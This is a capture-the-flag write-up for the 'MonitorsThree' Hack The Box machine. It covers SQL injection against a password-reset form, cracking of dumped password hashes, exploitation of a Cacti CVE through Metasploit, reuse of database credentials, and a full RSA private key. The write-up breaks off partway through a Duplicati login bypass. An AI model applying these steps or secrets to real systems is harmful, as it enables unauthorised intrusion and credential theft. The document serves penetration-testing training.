# Initial Enumeration

As usual we are provided only a sigle IPv4 address as main entry point: `10.129.165.87`.

But we are aware that the main backend server OS is a Linux based one.

![bb08de95717fb312b532e2c3b4d03368.png](../../../_resources/bb08de95717fb312b532e2c3b4d03368.png)

Without further do I will start by enumerating all the alive ports over the TCP protocol.

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0=
|   256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=8/28%OT=22%CT=%CU=32292%PV=Y%DS=2%DC=T%G=N%TM=66CEF65F%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550ST11NW7%O6=M550ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 16.838 days (since Sun Aug 11 15:58:51 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

And for the sake of doing it I will perform the same task but this time over UDP.

```
──(root㉿kali)-[/home/user/Downloads]
└─# nmap -sU -F 10.129.165.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 12:06 CEST
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 57.10% done; ETC: 12:07 (0:00:35 remaining)
Nmap scan report for 10.129.165.87
Host is up (0.085s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 109.97 seconds

```

&nbsp;

So far not much is open from the outside, the SSH is there for letting us login on the machine as soon we find a valid set of credentials otherwise we should channel our focus on the HTTP service.

# SSH

As usual SSH will not be our door to the system as the SSH is mostly patched and brute forcing will not be a indented resolution path. For this reasons I will momentally move on to other services and come back if I can find something more interesting.

&nbsp;

# HTTP

Nmap identified that the default port 80/TCP might be hosting a website over the URL `http://monitorsthree.htb/`

![18fc9e8558fdf7d9bb9c7f46b3b6c92e.png](../../../_resources/18fc9e8558fdf7d9bb9c7f46b3b6c92e.png)

Before even approaching the website I will execute a check over possible hidden folders on the site itself.

```
┌──(root㉿kali)-[/home/user/Downloads]
└─# dirsearch -u "http://monitorsthree.htb/"
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/user/Downloads/reports/http_monitorsthree.htb/__24-08-28_12-15-07.txt

Target: http://monitorsthree.htb/

[12:15:07] Starting: 
[12:15:08] 301 -  178B  - /js  ->  http://monitorsthree.htb/js/
[12:15:23] 301 -  178B  - /admin  ->  http://monitorsthree.htb/admin/
[12:15:24] 403 -  564B  - /admin/
[12:15:50] 301 -  178B  - /css  ->  http://monitorsthree.htb/css/
[12:15:59] 301 -  178B  - /fonts  ->  http://monitorsthree.htb/fonts/
[12:16:04] 301 -  178B  - /images  ->  http://monitorsthree.htb/images/
[12:16:04] 403 -  564B  - /images/
[12:16:08] 403 -  564B  - /js/
[12:16:11] 200 -    4KB - /login.php

Task Completed

```

&nbsp;Indeed I see an admin portal wth a login function in php, which I guess will be used to perform the login action. I will check for possible hidden VHOSTS as well.

```
──(root㉿kali)-[/home/user/Downloads]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://monitorsthree.htb/" -H "Host:FUZZ.monitorsthree.htb" -fl 338

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsthree.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 338
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
:: Progress: [19966/19966] :: Job [1/1] :: 888 req/sec :: Duration: [0:00:19] :: Errors: 0 ::

```

&nbsp;Indeed there is a secondary subdomains as well, pointing our mind about what technology used should be available on the machine?

Now the /admin/ portal seems not reachable from our anonymous user, denoting that we need to login first so we can get a cookie that then can be used to perform a full authentication against the admin endpoint.

The password reset policy seems sending something via email maybe?

![eebc720f7f2da9ef191807444db0262b.png](../../../_resources/eebc720f7f2da9ef191807444db0262b.png)

I don't think that the page is vulnerable to SQLi, I can absolutely try.

![e7e3742d3f12fb8dc28da0dc2a6ec636.png](../../../_resources/e7e3742d3f12fb8dc28da0dc2a6ec636.png)

The Admin endpoint seems still forcing us to get a valid login:

```
[12:30:01] Starting: admin/
[12:30:31] 301 -  178B  - /admin/assets  ->  http://monitorsthree.htb/admin/assets/
Added to the queue: admin/assets/
[12:30:42] 302 -    0B  - /admin/dashboard.php  ->  /login.php
[12:30:43] 200 -    0B  - /admin/db.php
[12:30:50] 200 -  303B  - /admin/footer.php
[12:31:03] 302 -    0B  - /admin/logout.php  ->  /login.php
[12:31:44] 302 -    0B  - /admin/users.php  ->  /login.php

```

I think we can move forward to the other subdomain.

# CACTI

Now If we add to our local hosts file we can see that the page is about the Cacti monitoring tool and from the footer we can see that the running version is 1.2.26.

![aac087c49426fea1df0edbcfd51a83e8.png](../../../_resources/aac087c49426fea1df0edbcfd51a83e8.png)

Now googling around seems like we have a possible CVE that unfortunately requires a authenticated session:

https://packetstormsecurity.com/files/176995/Cacti-pollers.php-SQL-Injection-Remote-Code-Execution.html

https://github.com/5ma1l/CVE-2024-25641

Now looking back seems like the "Password Reset" function is vulnerable to SQLi?

![5128f622bbd8cacc128a84eb916416f5.png](../../../_resources/5128f622bbd8cacc128a84eb916416f5.png)

```
[13:42:43] [INFO] retrieved: in
formation_schema
[13:52:45] [INFO] retrieved: 
monitorsthree_db
available databases [2]:
[*] information_schema
[*] monitorsthree_db

[14:02:24] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-08282024_0138pm.csv'

[*] ending @ 14:02:24 /2024-08-28/
```

And the tables in the DB:

```
Database: monitorsthree_db
[6 tables]
+---------------+
| changelog     |
| customers     |
| invoice_tasks |
| invoices      |
| tasks         |
| users         |
+---------------+

```

I feel we need to dig deeper into users table.

```
Database: monitorsthree_db
Table: users
[4 entries]
+----+-----------+-----------------------------+----------------------------------+-------------------+-----------------------+------------+------------+-----------+
| id | username  | email                       | password                         | name              | position              | dob        | start_date | salary    |
+----+-----------+-----------------------------+----------------------------------+-------------------+-----------------------+------------+------------+-----------+
| 2  | admin     | admin@monitorsthree.htb     | 31a181c8372e3afc59dab863430610e8 | Marcus Higgins    | Super User            | 1978-04-25 | 2021-01-12 | 320800.00 |
| 7  | dthompson | mwatson@monitorsthree.htb   | c585d01f2eb3e6e1073e92023088a3dd | Michael Watson    | Website Administrator | 1985-02-15 | 2021-05-10 | 75000.00  |
| 6  | janderson | janderson@monitorsthree.htb | 1e68b6eb86b45f6d92f8f292428f77ac | Jennifer Anderson | Network Engineer      | 1990-07-30 | 2021-06-20 | 68000.00  |
| 5  | mwatson   | dthompson@monitorsthree.htb | 633b683cc128fe244b00f176c8a950f5 | David Thompson    | Database Manager      | 1982-11-23 | 2022-09-15 | 83000.00  |
+----+-----------+-----------------------------+----------------------------------+-------------------+-----------------------+------------+------------+-----------+
[14:41:28] [INFO] table 'monitorsthree_db.users' dumped to CSV file '/root/.ghauri/monitorsthree.htb/dump/monitorsthree_db/users.csv'

[14:41:28] [INFO] fetched data logged to text files under '/root/.ghauri/monitorsthree.htb'

[*] ending @ 14:41:28 /2024-08-28/


```

And after a while we have the credentials of admin user.

```
31a181c8372e3afc59dab863430610e8:greencacti2001           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 31a181c8372e3afc59dab863430610e8
Time.Started.....: Wed Aug 28 14:55:04 2024 (7 secs)
Time.Estimated...: Wed Aug 28 14:55:11 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1180.1 kH/s (0.48ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7786496/14344385 (54.28%)
Rejected.........: 0/7786496 (0.00%)
Restore.Point....: 7782400/14344385 (54.25%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: grega1987tomazin -> green3484
Hardware.Mon.#1..: Util: 34%

Started: Wed Aug 28 14:53:55 2024
Stopped: Wed Aug 28 14:55:13 2024

```

![c4a13ce6494a8d40652d9b72adc3e367.png](../../../_resources/c4a13ce6494a8d40652d9b72adc3e367.png)

Now we should be able to use the exploit we found in metasploit. The first is not working:

```
msf6 exploit(multi/http/cacti_pollers_sqli_rce) > run

[*] Started reverse TCP handler on 172.16.239.130:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking Cacti version
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The web server is running Cacti version 1.2.26 "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/cacti_pollers_sqli_rce) > 

```

The second is this: https://github.com/5ma1l/CVE-2024-25641

This can be exploited directly from Metasploit.

![4618f9c6ba372a655f7316787994ffdb.png](../../../_resources/4618f9c6ba372a655f7316787994ffdb.png)

&nbsp;

# Road to USER.txt

Now we need to find a way to get to the first flag, and as we saw before our user right now is **www-data**. I see the default sql used by the cacti backend.

```
Listing: /var/www/html/cacti
============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040755/rwxr-xr-x  4096    dir   2023-12-21 00:32:29 +0100  .github
100644/rw-r--r--  3320    fil   2023-12-21 00:32:29 +0100  .gitignore
100644/rw-r--r--  2138    fil   2023-12-21 00:32:29 +0100  .mdl_style.rb
100644/rw-r--r--  1621    fil   2023-12-21 00:32:29 +0100  .mdlrc
100600/rw-------  1024    fil   2024-05-18 23:56:56 +0200  .rnd
100644/rw-r--r--  278897  fil   2023-12-21 00:32:29 +0100  CHANGELOG
100644/rw-r--r--  15171   fil   2023-12-21 00:32:29 +0100  LICENSE
100644/rw-r--r--  11342   fil   2023-12-21 00:32:29 +0100  README.md
100644/rw-r--r--  5669    fil   2023-12-21 00:32:29 +0100  about.php
100644/rw-r--r--  60883   fil   2023-12-21 00:32:29 +0100  aggregate_graphs.php
100644/rw-r--r--  25710   fil   2023-12-21 00:32:29 +0100  aggregate_templates.php
100644/rw-r--r--  16213   fil   2023-12-21 00:32:29 +0100  auth_changepassword.php
100644/rw-r--r--  15211   fil   2023-12-21 00:32:29 +0100  auth_login.php
100644/rw-r--r--  19161   fil   2023-12-21 00:32:29 +0100  auth_profile.php
100644/rw-r--r--  24203   fil   2023-12-21 00:32:29 +0100  automation_devices.php
100644/rw-r--r--  36742   fil   2023-12-21 00:32:29 +0100  automation_graph_rules.php
100644/rw-r--r--  42897   fil   2023-12-21 00:32:29 +0100  automation_networks.php
100644/rw-r--r--  31747   fil   2023-12-21 00:32:29 +0100  automation_snmp.php
100644/rw-r--r--  18785   fil   2023-12-21 00:32:29 +0100  automation_templates.php
100644/rw-r--r--  38723   fil   2023-12-21 00:32:29 +0100  automation_tree_rules.php
100755/rwxr-xr-x  2959    fil   2023-12-21 00:32:29 +0100  boost_rrdupdate.php
040755/rwxr-xr-x  4096    dir   2023-12-21 00:32:29 +0100  cache
100644/rw-r--r--  127142  fil   2023-12-21 00:32:29 +0100  cacti.sql

```

I see some dumplicati containers in /opt:

```
Listing: /opt
=============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2024-05-20 17:53:42 +0200  backups
040711/rwx--x--x  4096  dir   2024-05-20 16:38:46 +0200  containerd
100644/rw-r--r--  318   fil   2024-05-26 18:08:48 +0200  docker-compose.yml
040755/rwxr-xr-x  4096  dir   2024-08-18 10:00:01 +0200  duplicati


```

And under /home I see only one user so far:

![dbe3ac51f29483e9eccfe48c6d35e8fa.png](../../../_resources/dbe3ac51f29483e9eccfe48c6d35e8fa.png)

Now to make my life easier I will upload Linpeas.sh and run thru a scan and searching for ways on how to PE to marcus. As guesses there are some containerization technologies installed on the machine:

```
════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
/usr/bin/docker
/usr/sbin/runc

```

Those are the ports running internally on the loopback address.

```
acktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      1196/mono           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1267/nginx: worker  
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:39955         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1267/nginx: worker  

```

As guessed I see only 2 users:

```
╔══════════╣ Users with console
marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
root:x:0:0:root:/root:/bin/bash

```

We can see the credentials used by cacti for the backend in the MYSQL db:

```
-rw-r--r-- 1 www-data www-data 6955 May 18 21:46 /var/www/html/cacti/include/config.php
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_username = 'cactiuser';
$database_password = 'cactiuser';
$database_port     = '3306';
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
#$rdatabase_type     = 'mysql';
#$rdatabase_default  = 'cacti';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
#$rdatabase_port     = '3306';
#$rdatabase_ssl      = false;
#$rdatabase_ssl_key  = '';
#$rdatabase_ssl_cert = '';
#$rdatabase_ssl_ca   = '';

```

And I see that **Marcus** is available in the webgui:

![9dfabc55c5c887246ae0efe403cf2915.png](../../../_resources/9dfabc55c5c887246ae0efe403cf2915.png)

If we surf with the credentials we can see the following folders that are interesting:

```
www-data@monitorsthree:/tmp$ mysql -u your_username -p cacti

mysql -u your_username -p cacti
Enter password: 
ERROR 1045 (28000): Access denied for user 'your_username'@'localhost' (using password: NO)
www-data@monitorsthree:/tmp$ mysql -u cactiuser -p cacti
mysql -u cactiuser -p cacti
Enter password: cactiuser

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 10424
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [cacti]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.001 sec)

```

&nbsp;![fbcba806235836916d30958ade14c1d0.png](../../../_resources/fbcba806235836916d30958ade14c1d0.png)

One of these tables is the right one. Bingo!

```
MariaDB [cacti]> select * from user_auth;
select * from user_auth;
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     0 | Administrator | marcus@monitorsthree.htb |                      |                 | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   436423766 |
|  3 | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     0 | Guest Account | guest@monitorsthree.htb  |                      |                 | on        | on        | on           |                |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |  3774379591 |
|  4 | marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
3 rows in set (0.000 sec)

MariaDB [cacti]> 

```

&nbsp;Now I will try to crack his password again, maybe it is still about password reuse?

```
$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIa...9IBjtK
Time.Started.....: Wed Aug 28 15:31:49 2024 (10 secs)
Time.Estimated...: Wed Aug 28 15:31:59 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       46 H/s (9.22ms) @ Accel:8 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 448/14344385 (0.00%)
Rejected.........: 0/448 (0.00%)
Restore.Point....: 384/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: jeffrey -> miamor
Hardware.Mon.#1..: Util: 73%

```

&nbsp;Nice so let's see it we can ssh now?

![83e4bb51526280e29ccb88ce8931f35c.png](../../../_resources/83e4bb51526280e29ccb88ce8931f35c.png)

Seems like no? But what about directly from the shell session instead? Seems no!

But we can su directly from the same seesion!

```
www-data@monitorsthree:/tmp$ su marcus
su marcus
Password: 12345678910

marcus@monitorsthree:/tmp$ cd /home/marcus
cd /home/marcus
marcus@monitorsthree:~$ ls -al
ls -al
total 32
drwxr-x--- 4 marcus marcus 4096 Aug 16 11:35 .
drwxr-xr-x 3 root   root   4096 May 26 16:34 ..
lrwxrwxrwx 1 root   root      9 Aug 16 11:29 .bash_history -> /dev/null
-rw-r--r-- 1 marcus marcus  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 marcus marcus 3771 Jan  6  2022 .bashrc
drwx------ 2 marcus marcus 4096 Aug 16 11:35 .cache
-rw-r--r-- 1 marcus marcus  807 Jan  6  2022 .profile
drwx------ 2 marcus marcus 4096 Aug 27 16:13 .ssh
-rw-r----- 1 root   marcus   33 Aug 27 16:14 user.txt
marcus@monitorsthree:~$ cat user.txt
cat user.txt
0255940cfd002dc2a0a4f8fac6865461
marcus@monitorsthree:~$ 

```

&nbsp;

# Road to ROOT.txt

Now we can grab the private key and we can get a nice shell via SSH:

![9fd0a35a8558bc20f9f51dc175103bbb.png](../../../_resources/9fd0a35a8558bc20f9f51dc175103bbb.png)

Now I will run linpeas.sh again and check if there are any other way to root?(my guessing is that docker container have something to do with PE 2 ROOT)

```
marcus@monitorsthree:/opt$ tree .
.
├── backups
│   └── cacti
│       ├── duplicati-20240526T162923Z.dlist.zip
│       ├── duplicati-20240820T113028Z.dlist.zip
│       ├── duplicati-20240827T161332Z.dlist.zip
│       ├── duplicati-20240828T110000Z.dlist.zip
│       ├── duplicati-b09b8dbbeefb54cf6b26bdeb0f22fbc2d.dblock.zip
│       ├── duplicati-b4a39c5a52db3407ab8dc78bb456d888a.dblock.zip
│       ├── duplicati-bb19cdec32e5341b7a9b5d706407e60eb.dblock.zip
│       ├── duplicati-bc2d8d70b8eb74c4ea21235385840e608.dblock.zip
│       ├── duplicati-i7329b8d56a284479bade001406b5dec4.dindex.zip
│       ├── duplicati-i962e39c3a64d4bc2860e99536f21ec1f.dindex.zip
│       ├── duplicati-ibd76ac35a137417b9cd7c7ca4d05ac8b.dindex.zip
│       └── duplicati-ie7ca520ceb6b4ae081f78324e10b7b85.dindex.zip
├── containerd  [error opening dir]
├── docker-compose.yml
└── duplicati
    └── config
        ├── control_dir_v2
        │   └── lock_v2
        ├── CTADPNHLTC.sqlite
        └── Duplicati-server.sqlite

6 directories, 16 files

```

Seems like duplicati2 is running in a docker container and it is backing up the config of the cacti server. And setting up a rever port fw via LigoloNG we can see the login page.

![d2807c5359a04aa7feade848eb0acb1a.png](../../../_resources/d2807c5359a04aa7feade848eb0acb1a.png)

Now I asked around and seems like it is about this exploit: [https://github.com/duplicati/duplicati/issues/5197\[\](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee)](https://github.com/duplicati/duplicati/issues/5197%5B%5D%28https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee%29 "https://github.com/duplicati/duplicati/issues/5197%5B%5D(https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee)")

Checking the option folder we can see the server passphrase:

![27e078ca736094767a8b68d5b1a7bcd2.png](../../../_resources/27e078ca736094767a8b68d5b1a7bcd2.png)

&nbsp;

```
┌──(root㉿kali)-[/home/user/Downloads]
└─# cat marcus.key 
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvixu0PvY/LjX7oXpNZAKmgbcc+h51atQog5HhZgxMTDaprRx
nXh5i7z0STjAMYQTa2NErNWA2Xm79HHJikosHzSfS630Bm87HR+0cdqtaxD+vDiN
nlG24O+fhbQeVJYFZbUjAmKmJT7ppC3Vta5/T9WNK8ARrkLrf5gDbIxXCp0FV5Ql
LCviGJAKXbjrPtNFBKsW2WuvboJCuS4Sp8W378ydzUlHv3j8clpvluK5asOL7tZ0
eBgAS9PXunL1/UYaI8c3wQ57Dg9xfsJPGAg9OA9EG/MeG49FA8I2KUJae3YcV+e7
6g57t6wRmVkzMcT2DDw6Als2lZ7cuc0kdBhdkQIDAQABAoIBAAqne11gsLFG600J
Ck3WiCuFLSJewL2iY4nythnTUxU0DRnoE9HsSxXzs/VqtSTJBxv9853ht75nWir5
mX6ShXqJlI+VOy3Fm0iYS0ASLeNI0Far7e4z2oSrVBL16nmXbo26Sk/yxidhyQ3q
RfXv5ODMgGRWNj9eryomsnFpQuKcnLB4Wr5nLwsLyYqceRG+Q2YXATSmBQ7UgZEL
xDqes1PbLrpjEb4ZsRP/vK1iDq8686NT20g+iq2OWqVufkkCHCEZFNjIR1KFOPrs
sz/ROrnGNwKTzUqt3lH8QZHzsfjDNj+wpGZdXExivZbGeTc4P/HTOf+r5cFziqh3
9Q+v/gECgYEA/1H47ATJzuXIyIeqDDk76KhYHeienZZwdQ0FZKZD+GhJiguwTrLI
/1Qvk3dbTjIl1HcPFIKLdNeIzKCrWpMYeOPEPzMt3DfXY/3nRUZgmcMHvk9daRrv
O8GuPFf6RaGqfo8sKV5dJeTwOfuUhEDOPNpKduB6XvAV4JtU0oT8OpECgYEAvq4O
ZGiE3LyXOo6dwfm5RYTU6ssd89RjG9IVOZnd/x0T6fpiZWoxGKMDVxuU+bVBZxd0
o8jnMy+LC2UAh75pem8oCq7mfwEhgXhWM8PwKnE+BuPXlEA+6StOz2tp9ITtuCEQ
JCnejqg5wbRWSPBtAdwPCocrD1Bzgs6034h9cwECgYA1MImP+ctlC9/RTtnxI/dE
F9YLnQt2PwH8kJLgDfc5B9jSJm87ZemTr6Edso7V8oKJCaidmDifRcuc/ZfVDbHa
dXDLzcivCP8ZOKr2dpvnTIcPcY8/NzpBk67NqXJdETnolcEYeS0kmNYm7i9Zgfq1
GLDMpSU5JAEawqFgHg5B0QKBgDEOnNtOXKhhyNKi8ImAUx9EnnbNzSX3RYxZz2Yj
ZQ8GjyIKbhhDauA4yFo32WspK+t3CGY/AOSVXcOPt8Q0w/Rg9r9Q4jJYuyMRL7Rf
u8FfoyKoqcUVhln872jD7N2g+Xv+3aVANGcldr6URAK+AH2S/TerMPPesek8fyJn
fkcBAoGAOKrx0JLEj7PVO6d1cAlO6Rbbxqzts7HcFkdglXICpPoZKHsk9A8B19+0
u3olFqQ1LhkGvEEbQjHGng51RnJvNCgSw18PExFiLLrAoAYPXxHG+tnlfB60R0U8
nsZWMUxRjWeRCVaA3YjtTtVuwiqBrH5uv4eWekTTADaMUXcg0T0=
-----END RSA PRIVATE KEY-----

```

We need first to base64 decode and HEX encode the password passphrase from DB.

```
 echo "Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho="|base64 -d|xxd -p -c256 
59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a

```

Now we need to perform a login action with whatever password we want and catch the request in burpsuite. And we need to grab the session nonce from the response:
````
POST /login.cgi HTTP/1.1

Host: 240.0.0.1:8200

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 61

Origin: http://240.0.0.1:8200

Connection: keep-alive

Referer: http://240.0.0.1:8200/login.html

Cookie: xsrf-token=286LRM1LYlldUo2TEZ7YQ6eqNk9XT%2Bk6Pc5%2BkVWOpYA%3D; session-nonce=wyMIqthsnD%2FMzActfWKWtHMlHrgXRavLeMIapznu2%2BA%3D



password=anWPRsVZ%2BT%2BQzt2BLx5jbqbE%2B9e2HIqOV6ZtaHjQ6ZM%3D
````
Now we can use whatever browser we want to execute the backend JS code used by Duplicati to salt the password and effe4ctively bypass the login with the formula:
